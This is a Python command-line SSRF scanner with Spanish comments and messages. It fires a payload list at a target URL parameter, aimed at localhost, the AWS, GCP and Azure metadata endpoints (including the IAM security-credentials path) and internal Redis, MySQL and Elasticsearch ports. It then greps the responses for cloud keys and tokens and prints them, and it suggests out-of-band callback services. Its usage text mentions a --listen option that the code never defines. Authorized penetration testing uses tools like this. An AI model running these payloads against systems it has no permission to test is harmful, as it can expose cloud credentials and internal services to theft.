#!/usr/bin/env python3
"""
ssrf_scanner.py -- Detector de Server-Side Request Forgery
Uso:
    python3 ssrf_scanner.py --url http://objetivo.com/fetch --param url
    python3 ssrf_scanner.py --url "http://objetivo.com/fetch?url=" --listen
"""
import argparse, threading, urllib.request, urllib.error, urllib.parse, http.server, time

class C:
    RED="[91m";GREEN="[92m";YELLOW="[93m"
    BLUE="[94m";BOLD="[1m";RESET="[0m"

def ok(m):   print(C.GREEN+"  [+] "+C.RESET+m)
def info(m): print(C.BLUE+"  [*] "+C.RESET+m)
def warn(m): print(C.YELLOW+"  [!] "+C.RESET+m)
def crit(m): print(C.RED+C.BOLD+"  [VULNERABLE] "+C.RESET+m)

SSRF_PAYLOADS = [
    ("localhost_80",        "http://localhost/"),
    ("localhost_admin",     "http://localhost/admin"),
    ("127.0.0.1",           "http://127.0.0.1/"),
    ("127.1_short",         "http://127.1/"),
    ("0.0.0.0",             "http://0.0.0.0/"),
    ("aws_metadata",        "http://169.254.169.254/latest/meta-data/"),
    ("aws_iam",             "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("gcp_metadata",        "http://metadata.google.internal/computeMetadata/v1/"),
    ("azure_metadata",      "http://169.254.169.254/metadata/instance"),
    ("internal_redis",      "http://127.0.0.1:6379/"),
    ("internal_mysql",      "http://127.0.0.1:3306/"),
    ("internal_elastic",    "http://127.0.0.1:9200/"),
]

CLOUD_INDICATORS = [
    "ami-","instance-id","public-ipv4","iam","security-credentials",
    "computeMetadata","access_key","secret_key","token",
    "subscriptionId","resourceGroupName",
]

def fetch_with_payload(base_url, param, payload_url):
    try:
        if param:
            url = base_url + "?" + param + "=" + urllib.parse.quote(payload_url, safe=":/")
        else:
            url = base_url + urllib.parse.quote(payload_url, safe=":/")
        req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode("utf-8","ignore")
    except Exception:
        return None, ""

def banner():
    print("[96m[1m")
    print("  ╔═══════════════════════════════════════════╗")
    print("  ║   SSRF SCANNER -- SSRF Detector           ║")
    print("  ╚═══════════════════════════════════════════╝")
    print("[0m")

def main():
    banner()
    p = argparse.ArgumentParser()
    p.add_argument("--url",   required=True)
    p.add_argument("--param", default=None)
    args = p.parse_args()

    info("Objetivo: "+args.url)
    info("Probando "+str(len(SSRF_PAYLOADS))+" payloads SSRF...")
    print()

    for name, payload_url in SSRF_PAYLOADS:
        code, body = fetch_with_payload(args.url, args.param, payload_url)
        if body:
            for indicator in CLOUD_INDICATORS:
                if indicator.lower() in body.lower():
                    crit("SSRF CONFIRMADO -- Metadata cloud accesible")
                    crit("Payload: "+payload_url)
                    crit("Indicador: "+indicator)
                    print()
                    print("  Respuesta (primeros 300 chars):")
                    print("  "+body[:300])
                    print()
                    break
            if "root:" in body or "[fonts]" in body:
                crit("SSRF -> LFI detectado con payload: "+payload_url)

    print()
    info("Si el servidor hace peticiones salientes, usa Burp Collaborator:")
    info("Payload: http://TU_ID.burpcollaborator.net")
    info("O interactsh: https://app.interactsh.com")

if __name__ == "__main__":
    main()
